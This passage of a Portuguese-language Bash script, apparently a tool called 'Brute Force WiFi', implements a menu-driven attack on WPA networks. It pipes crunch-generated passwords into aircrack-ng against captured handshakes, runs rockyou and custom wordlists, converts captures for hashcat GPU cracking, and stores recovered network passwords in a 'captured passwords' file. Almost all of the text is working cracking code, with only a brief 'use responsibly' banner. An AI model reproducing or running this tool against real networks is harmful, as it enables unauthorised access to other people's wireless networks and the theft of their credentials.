}

setup_crunch_pipe() {
    clear
    show_header
    show_status
    echo -e "${CYAN}[*] Configurando ataque direto com crunch (via pipe)${NC}"
    echo -e "${GREEN}[+] Este método NÃO consome espaço em disco!${NC}"
    echo

    read -p "Tamanho mínimo [8]: " CRUNCH_MIN_LEN
    read -p "Tamanho máximo [14]: " CRUNCH_MAX_LEN

    echo -e "${YELLOW}[DICA] Escolha o conjunto de caracteres:${NC}"
    echo -e "    ${CYAN}1${NC} - Números apenas: 1234567890"
    echo -e "    ${CYAN}2${NC} - Letras minúsculas: a-z"
    echo -e "    ${CYAN}3${NC} - Letras maiúsculas: A-Z"
    echo -e "    ${CYAN}4${NC} - Alfanumérico (minúsculas + números)"
    echo -e "    ${CYAN}5${NC} - Alfanumérico + Especiais"
    echo -e "    ${CYAN}6${NC} - Personalizado"
    echo -e "    ${CYAN}7${NC} - 📖 Ajuda sobre os conjuntos de caracteres"
    echo
    read -p "Escolha uma opção [5]: " charset_option
    
    # Se escolher 7, mostra ajuda e depois volta para o mesmo menu
    if [[ "$charset_option" == "7" ]]; then
        show_crunch_charset_help
        setup_crunch_pipe   # chama novamente a função para refazer as perguntas
        return
    fi

    case ${charset_option:-5} in
        1) CRUNCH_CHARSET="1234567890" ;;
        2) CRUNCH_CHARSET="abcdefghijklmnopqrstuvwxyz" ;;
        3) CRUNCH_CHARSET="ABCDEFGHIJKLMNOPQRSTUVWXYZ" ;;
        4) CRUNCH_CHARSET="abcdefghijklmnopqrstuvwxyz1234567890" ;;
        5) CRUNCH_CHARSET="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*()-_=+[]{}|;:,.<>?/" ;;
        6) read -p "Digite os caracteres: " CRUNCH_CHARSET ;;
        *) CRUNCH_CHARSET="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*()-_=+[]{}|;:,.<>?/" ;;
    esac

    CRUNCH_MIN_LEN=${CRUNCH_MIN_LEN:-8}
    CRUNCH_MAX_LEN=${CRUNCH_MAX_LEN:-14}

    # Limpa a tela e mostra novamente o header/status
    clear
    show_header
    show_status

    CRACK_MODE="PIPE"
    WORDLIST_FILE=""

    # Chama a função de confirmação (que exibirá o resumo final)
    ask_start_cracking_pipe
}

# ------------------------------------------------------------
# WORDLIST - ROCKYOU E PERSONALIZADA
# ------------------------------------------------------------
setup_rockyou_wordlist() {
    echo -e "${CYAN}[*] Procurando rockyou.txt...${NC}"
    local possible_paths=(
        "/usr/share/wordlists/rockyou.txt"
        "/usr/share/wordlists/rockyou.txt.gz"
        "/usr/share/dict/rockyou.txt"
        "/opt/wordlists/rockyou.txt"
    )

    for path in "${possible_paths[@]}"; do
        if [[ -f "$path" ]]; then
            if [[ "$path" == *.gz ]]; then
                echo -e "${YELLOW}[+] Descompactando...${NC}"
                gunzip -c "$path" > "rockyou.txt"
                WORDLIST_FILE="rockyou.txt"
            else
                WORDLIST_FILE="$path"
            fi
            echo -e "${GREEN}[+] Wordlist: $WORDLIST_FILE${NC}"
            CRACK_MODE="FILE"
            return
        fi
    done

    echo -e "${RED}[-] rockyou.txt não encontrado${NC}"
    select_wordlist_mode
}

setup_custom_wordlist() {
    select_user_wordlist
    if [[ $? -ne 0 ]]; then
        select_wordlist_mode
    fi
}

generate_crunch_wordlist() {
    echo -e "${CYAN}[*] Gerando wordlist com crunch...${NC}"
    echo -e "${YELLOW}[!] AVISO: Tamanhos grandes podem gerar arquivos IMENSOS!${NC}"
    echo

    read -p "Tamanho mínimo [6]: " min_len
    read -p "Tamanho máximo [8]: " max_len
    read -p "Caracteres [abcdefghijklmnopqrstuvwxyz]: " charset

    min_len=${min_len:-6}
    max_len=${max_len:-8}
    charset=${charset:-abcdefghijklmnopqrstuvwxyz}

    local timestamp=$(date +%Y%m%d_%H%M%S)
    WORDLIST_FILE="wordlist_crunch_${min_len}_${max_len}_${timestamp}.txt"

    echo -e "${YELLOW}[!] Gerando wordlist...${NC}"
    if crunch "$min_len" "$max_len" "$charset" -o "$WORDLIST_FILE" 2>/dev/null; then
        local line_count=$(wc -l < "$WORDLIST_FILE" 2>/dev/null | awk '{print $1}')
        echo -e "${GREEN}[✓] Wordlist gerada: $WORDLIST_FILE${NC}"
        echo -e "${GREEN}[+] Total de palavras: $line_count${NC}"

        echo -e "${YELLOW}[!] Deseja salvar esta wordlist no repositório do usuário? (s/n)${NC}"
        read -p "> " save_repo
        if [[ "$save_repo" =~ ^[sS]$ ]]; then
            read -p "Nome para salvar: " repo_name
            local user_dir="/usr/share/wordlists/wordlist_usuario"
            mkdir -p "$user_dir" 2>/dev/null || sudo mkdir -p "$user_dir"
            local dest_path="$user_dir/$repo_name"
            if [[ ! "$repo_name" =~ \.txt$ ]]; then
                dest_path="$user_dir/${repo_name}.txt"
            fi
            if cp "$WORDLIST_FILE" "$dest_path" 2>/dev/null; then
                echo -e "${GREEN}[+] Wordlist salva em $dest_path${NC}"
            else
                sudo cp "$WORDLIST_FILE" "$dest_path"
                sudo chmod 644 "$dest_path"
                echo -e "${GREEN}[+] Wordlist salva em $dest_path (com sudo)${NC}"
            fi
        fi
        CRACK_MODE="FILE"
    else
        echo -e "${RED}[-] Falha ao gerar wordlist${NC}"
        WORDLIST_FILE=""
        select_wordlist_mode
    fi
}

# ------------------------------------------------------------
# QUEBRA DE SENHA - CPU E GPU
# ------------------------------------------------------------
crack_password_pipe() {
    clear
    show_header
    show_status
    echo -e "${CYAN}[*] Iniciando quebra via PIPE...${NC}"

    local cap_file="${HANDSHAKE_FILE}-01.cap"
    if [[ ! -f "$cap_file" ]]; then
        echo -e "${RED}[-] Handshake não encontrado${NC}"
        return
    fi

    echo -e "${GREEN}[+] Handshake: $cap_file${NC}"
    echo -e "${GREEN}[+] Comando: crunch $CRUNCH_MIN_LEN $CRUNCH_MAX_LEN '$CRUNCH_CHARSET' | aircrack-ng -w - -b $TARGET_BSSID $cap_file${NC}"
    echo -e "${YELLOW}[!] Iniciando quebra...${NC}"

    local output_file="/tmp/crack_output_$$.txt"

    # Inicia o xterm em background
    xterm -hold -bg black -fg yellow -geometry 100x30 -T "Quebra via PIPE - $TARGET_SSID" -e \
        "echo '╔════════════════════════════════════════════╗'; \
         echo '║     QUEBRA DE SENHA VIA PIPE (CRUNCH)      ║'; \
         echo '╚════════════════════════════════════════════╝'; \
         echo ''; \
         echo 'Rede: $TARGET_SSID'; \
         echo 'BSSID: $TARGET_BSSID'; \
         echo 'Handshake: $cap_file'; \
         echo 'Crunch: $CRUNCH_MIN_LEN-$CRUNCH_MAX_LEN ($CRUNCH_CHARSET)'; \
         echo ''; \
         echo '================================================'; \
         crunch $CRUNCH_MIN_LEN $CRUNCH_MAX_LEN '$CRUNCH_CHARSET' 2>/dev/null | aircrack-ng -w - -b $TARGET_BSSID $cap_file 2>&1 | tee $output_file; \
         echo ''; \
         read -p 'Pressione Enter para fechar...'" &

    CRACK_PID=$!
    echo -e "${GREEN}[+] Quebra via pipe iniciada (PID: $CRACK_PID)${NC}"

    # Aguarda o término do xterm
    wait $CRACK_PID

    # Após o término, processa o resultado
    monitor_crack_result "$output_file"
}

crack_password_hashcat() {
    clear
    show_header
    show_status
    echo -e "${CYAN}[*] Iniciando quebra com hashcat (GPU)...${NC}"

    local cap_file="${HANDSHAKE_FILE}-01.cap"
    local hccapx_file="${HANDSHAKE_FILE}.hccapx"

    if [[ ! -f "$cap_file" ]]; then
        echo -e "${RED}[-] Handshake não encontrado${NC}"
        return
    fi

    echo -e "${YELLOW}[!] Convertendo handshake para hashcat...${NC}"
    if ! cap2hccapx "$cap_file" "$hccapx_file" 2>/dev/null; then
        echo -e "${RED}[-] Falha na conversão. Verifique se cap2hccapx está instalado.${NC}"
        return
    fi
    echo -e "${GREEN}[+] Conversão concluída: $hccapx_file${NC}"

    echo -e "${GREEN}[+] Wordlist: $WORDLIST_FILE${NC}"
    echo -e "${YELLOW}[!] Iniciando hashcat...${NC}"

    local output_file="/tmp/hashcat_output_$$.txt"
    local potfile="/tmp/hashcat_potfile_$$.pot"

    xterm -hold -bg black -fg yellow -geometry 120x35 -T "Hashcat GPU - $TARGET_SSID" -e \
        "echo '╔════════════════════════════════════════════╗'; \
         echo '║        QUEBRA COM GPU (HASHCAT)            ║'; \
         echo '╚════════════════════════════════════════════╝'; \
         echo ''; \
         echo 'Rede: $TARGET_SSID'; \
         echo 'BSSID: $TARGET_BSSID'; \
         echo 'Handshake: $hccapx_file'; \
         echo 'Wordlist: $WORDLIST_FILE'; \
         echo ''; \
         echo '================================================'; \
         hashcat -m 22000 -a 0 --force --potfile-path \"$potfile\" -o \"$output_file\" \"$hccapx_file\" \"$WORDLIST_FILE\" 2>&1; \
         echo ''; \
         echo '================================================'; \
         read -p 'Pressione Enter para fechar...'" &

    CRACK_PID=$!
    echo -e "${GREEN}[+] Hashcat iniciado (PID: $CRACK_PID)${NC}"
    wait "$CRACK_PID"
    monitor_hashcat_result "$output_file" "$potfile"
}

crack_password() {
    clear
    show_header
    show_status
    echo -e "${CYAN}[*] Iniciando quebra de senha (CPU)...${NC}"

    local cap_file="${HANDSHAKE_FILE}-01.cap"
    if [[ ! -f "$cap_file" ]]; then
        echo -e "${RED}[-] Handshake não encontrado${NC}"
        return
    fi

    echo -e "${GREEN}[+] Handshake: $cap_file${NC}"
    echo -e "${GREEN}[+] Wordlist: $WORDLIST_FILE${NC}"
    echo -e "${YELLOW}[!] Iniciando quebra...${NC}"

    local output_file="/tmp/crack_output_$$.txt"

    xterm -hold -bg black -fg yellow -geometry 100x30 -T "Quebra de Senha - $TARGET_SSID" -e \
        "echo 'Iniciando quebra de senha para rede: $TARGET_SSID'; \
         echo 'Handshake: $cap_file'; \
         echo 'Wordlist: $WORDLIST_FILE'; \
         echo '================================'; \
         aircrack-ng -w \"$WORDLIST_FILE\" -b \"$TARGET_BSSID\" \"$cap_file\" 2>&1 | tee \"$output_file\"; \
         read -p 'Pressione Enter para fechar...'" &

    CRACK_PID=$!
    echo -e "${GREEN}[+] Quebra iniciada (PID: $CRACK_PID)${NC}"
    wait "$CRACK_PID"
    monitor_crack_result "$output_file"
}

# ------------------------------------------------------------
# MONITORES DE RESULTADO
# ------------------------------------------------------------
monitor_crack_result() {
    local output_file="$1"
    while [[ ! -f "$output_file" ]]; do
        sleep 1
    done

    if grep -q "KEY FOUND" "$output_file"; then
        password=$(grep "KEY FOUND" "$output_file" | sed -n 's/.*\[\(.*\)\].*/\1/p')
        password=$(echo "$password" | tr -d '[:space:]')
        # Remove duplicação (caso ocorra)
        len=${#password}
        if (( len % 2 == 0 )); then
            half=$((len / 2))
            first_half="${password:0:half}"
            second_half="${password:half}"
            if [[ "$first_half" == "$second_half" ]]; then
                password="$first_half"
            fi
        fi
        echo -e "${GREEN}"
        echo "╔════════════════════════════════════════════╗"
        echo "║            🎉 SENHA ENCONTRADA!            ║"
        echo "║                                            ║"
        echo "║     🔑 SENHA: $password                    ║"
        echo "║                                            ║"
        echo "║        Rede: $TARGET_SSID                  ║"
        echo "╚════════════════════════════════════════════╝"
        echo -e "${NC}"
        save_password "$TARGET_SSID" "$TARGET_BSSID" "$password"
    else
        echo -e "${RED}[-] Senha não encontrada${NC}"
        echo -e "${YELLOW}[!] Tente com outra wordlist ou método${NC}"
    fi

    [[ -f "$output_file" ]] && rm -f "$output_file"

    echo -e "${YELLOW}[!] Limpando status do ataque...${NC}"
    clear_attack_status
    echo
    echo -e "${YELLOW}[!] Pressione Enter para voltar ao menu principal...${NC}"
    read
    show_initial_menu
}

monitor_hashcat_result() {
    local output_file="$1"
    local potfile="$2"

    sleep 2

    if [[ -f "$potfile" ]] && [[ -s "$potfile" ]]; then
        password=$(cat "$potfile" | cut -d':' -f2 | head -1)
        password=$(echo "$password" | tr -d '[:space:]')

        echo -e "${GREEN}"
        echo "╔════════════════════════════════════════════╗"
        echo "║            🎉 SENHA ENCONTRADA!            ║"
        echo "║                                            ║"
        echo "║     🔑 SENHA: $password                    ║"
        echo "║                                            ║"
        echo "║        Rede: $TARGET_SSID                  ║"
        echo "╚════════════════════════════════════════════╝"
        echo -e "${NC}"
        save_password "$TARGET_SSID" "$TARGET_BSSID" "$password"
    else
        echo -e "${RED}[-] Senha não encontrada${NC}"
        echo -e "${YELLOW}[!] Tente com outra wordlist ou método${NC}"
    fi

    [[ -f "$output_file" ]] && rm -f "$output_file"
    [[ -f "$potfile" ]] && rm -f "$potfile"
    [[ -f "${HANDSHAKE_FILE}.hccapx" ]] && rm -f "${HANDSHAKE_FILE}.hccapx"

    echo -e "${YELLOW}[!] Limpando status do ataque...${NC}"
    clear_attack_status
    echo
    echo -e "${YELLOW}[!] Pressione Enter para voltar ao menu principal...${NC}"
    read
    show_initial_menu
}

# ------------------------------------------------------------
# FUNÇÕES DE CONFIRMAÇÃO
# ------------------------------------------------------------
ask_start_cracking() {
    echo
    echo -e "${CYAN}=== CONFIGURAÇÃO CONCLUÍDA ===${NC}"
    echo -e "${GREEN}Handshake:${NC} ${HANDSHAKE_FILE}-01.cap"
    echo -e "${GREEN}Wordlist:${NC} $WORDLIST_FILE"
    echo -e "${GREEN}Alvo:${NC} $TARGET_SSID ($TARGET_BSSID)"
    echo

    read -p "Iniciar quebra de senha? (s/n): " start_crack
    case $start_crack in
        s|S|y|Y)
            crack_password
            ;;
        *)
            echo -e "${YELLOW}[!] Quebra cancelada${NC}"
            clear_attack_status
            echo -e "${YELLOW}[!] Pressione Enter para voltar ao menu...${NC}"
            read
            show_initial_menu
            ;;
    esac
}

ask_start_cracking_pipe() {
    echo
    echo -e "${CYAN}=== CONFIGURAÇÃO CONCLUÍDA (MODO PIPE) ===${NC}"
    echo -e "${GREEN}Handshake:${NC} ${HANDSHAKE_FILE}-01.cap"
    echo -e "${GREEN}Método:${NC} crunch $CRUNCH_MIN_LEN-$CRUNCH_MAX_LEN ('$CRUNCH_CHARSET') | aircrack-ng -w -"
    echo -e "${GREEN}Alvo:${NC} $TARGET_SSID ($TARGET_BSSID)"
    echo -e "${YELLOW}[!] NENHUM arquivo de wordlist será criado!${NC}"
    echo

    read -p "Iniciar quebra via pipe? (s/n): " start_crack
    case $start_crack in
        s|S|y|Y)
            crack_password_pipe
            ;;
        *)
            echo -e "${YELLOW}[!] Quebra cancelada${NC}"
            clear_attack_status
            echo -e "${YELLOW}[!] Pressione Enter para voltar ao menu...${NC}"
            read
            show_initial_menu
            ;;
    esac
}

# ------------------------------------------------------------
# SALVAR E MOSTRAR SENHAS
# ------------------------------------------------------------
save_password() {
    local ssid="$1"
    local bssid="$2"
    local password="$3"
    local timestamp=$(date "+%Y-%m-%d %H:%M:%S")

    if [[ ! -f "$PASSWORD_FILE" ]]; then
        echo "╔════════════════════════════════════════════╗" > "$PASSWORD_FILE"
        echo "║         SENHAS WIFI CAPTURADAS             ║" >> "$PASSWORD_FILE"
        echo "║              Brute Force WiFi              ║" >> "$PASSWORD_FILE"
        echo "╚════════════════════════════════════════════╝" >> "$PASSWORD_FILE"
        echo "" >> "$PASSWORD_FILE"
    fi

    echo "╔════════════════════════════════════════════╗" >> "$PASSWORD_FILE"
    echo "║ Data: $timestamp                           ║" >> "$PASSWORD_FILE"
    echo "║ SSID: $ssid                                ║" >> "$PASSWORD_FILE"
    echo "║ BSSID: $bssid                              ║" >> "$PASSWORD_FILE"
    echo "║ SENHA: $password                           ║" >> "$PASSWORD_FILE"
    echo "╚════════════════════════════════════════════╝" >> "$PASSWORD_FILE"
    echo "" >> "$PASSWORD_FILE"

    echo -e "${GREEN}[+] Senha salva em: $PASSWORD_FILE${NC}"
}

show_captured_passwords() {
    clear
    show_header
    show_status
    echo -e "${CYAN}=== SENHAS CAPTURADAS ===${NC}"
    echo

    if [[ ! -f "$PASSWORD_FILE" ]]; then
        echo -e "${YELLOW}[!] Nenhuma senha capturada ainda${NC}"
        echo
        read -p "Pressione Enter para voltar..."
        return
    fi

    cat "$PASSWORD_FILE"

    local total_passwords=$(grep -c "SENHA:" "$PASSWORD_FILE" 2>/dev/null || echo "0")
    echo -e "${GREEN}[+] Total de senhas capturadas: $total_passwords${NC}"
    echo
    read -p "Pressione Enter para voltar..."
}

# ------------------------------------------------------------
# MENU PRINCIPAL
# ------------------------------------------------------------
show_initial_menu() {
    clear
    show_header
    show_status

    echo -e "${CYAN}=== MENU PRINCIPAL ===${NC}"
    echo -e "${GREEN}[1]${NC} Configurar Interface"
    echo -e "${GREEN}[2]${NC} Iniciar Ataque (Varredura Redes)"
    echo -e "${GREEN}[3]${NC} Ver Senhas Capturadas"
    echo -e "${GREEN}[4]${NC} Sair"
    echo

    read -p "Selecione uma opção: " choice

    case $choice in
        1)
            if setup_interface; then
                echo -n -e "${YELLOW}Iniciar varredura das redes agora? (s/n): ${NC}"
                read scan_now
                if [[ "$scan_now" =~ ^[sS]$ ]]; then
                    clear_attack_status
                    if scan_networks && show_networks && select_target; then
                        select_attack_type
                    else
                        echo -e "${RED}[!] Falha no scan ou seleção do alvo${NC}"
                        read -p "Pressione Enter para continuar..."
                    fi
                    show_initial_menu
                else
                    show_initial_menu
                fi
            else
                echo -e "${RED}[!] Falha ao configurar interface${NC}"
                read -p "Pressione Enter para continuar..."
                show_initial_menu
            fi
            ;;
        2)
            if [[ -z "$MONITOR_INTERFACE" ]]; then
                echo -e "${RED}[!] Nenhuma interface configurada${NC}"
                echo -n -e "${YELLOW}[!] Deseja configurar agora? (s/n): ${NC}"
                read config_now
                if [[ "$config_now" =~ ^[sS]$ ]]; then
                    if setup_interface; then
                        clear_attack_status
                        if scan_networks && show_networks && select_target; then
                            select_attack_type
                        else
                            echo -e "${RED}[!] Falha no scan${NC}"
                            read -p "Pressione Enter para continuar..."
                        fi
                        show_initial_menu
                    else
                        echo -e "${RED}[!] Falha ao configurar${NC}"
                        read -p "Pressione Enter para continuar..."
                        show_initial_menu
                    fi
                else
                    show_initial_menu
                fi
            else
                echo -e "${YELLOW}[!] Usando interface: $MONITOR_INTERFACE${NC}"
                clear_attack_status
                if scan_networks && show_networks && select_target; then
                    select_attack_type
                else
                    echo -e "${RED}[!] Falha no scan${NC}"
                    read -p "Pressione Enter para continuar..."
                fi
                show_initial_menu
            fi
            ;;
        3)
            show_captured_passwords
            show_initial_menu
            ;;
        4)
            do_exit
            ;;
        *)
            echo -e "${RED}Opção inválida${NC}"
            read -p "Pressione Enter para continuar..."
            show_initial_menu
            ;;
    esac
}

# ------------------------------------------------------------
# MAIN
# ------------------------------------------------------------
main() {
    trap 'do_exit' INT TERM

    if ! check_dependencies; then
        exit 1
    fi

    check_hashcat
    mkdir -p handshakes

    echo -e "${GREEN}[+] Iniciando Brute Force WiFi${NC}"
    echo -e "${YELLOW}[!] Use com responsabilidade!${NC}"
    sleep 2

    while true; do
        show_initial_menu
    done
}

main
